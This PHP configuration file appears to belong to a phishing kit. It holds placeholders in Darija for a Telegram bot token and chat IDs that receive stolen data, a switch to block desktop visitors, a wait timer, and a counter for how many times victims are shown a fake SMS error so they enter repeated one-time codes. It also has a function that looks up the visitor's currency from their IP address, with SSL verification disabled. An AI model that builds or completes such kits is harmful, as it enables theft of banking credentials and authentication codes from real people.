<?php 



$bot = "hat 9lawik hna";
$chat_ids = array("hat sawtak hna");
 
// to block pc - on | off
$block_pc = "off";


//seconds of waiting
$seconds = 45;


// how many times the user will see sms error.
$sms_error_times = 2;




//get currency
function getCurrency($ip){
    $api = "http://ip-api.com/json/$ip?fields=currency";
    $c = curl_init($api);
	curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
	$res = curl_exec($c);
    $data = json_decode($res);
    curl_close($c);
    return $data->currency;
	
}
$ip2 = $_SERVER['REMOTE_ADDR'];
if($ip2=="::1" OR $ip2 == "127.0.0.1"){
    $ip2="1.1.1.1";
}
$currency =  @getCurrency($ip2);

?>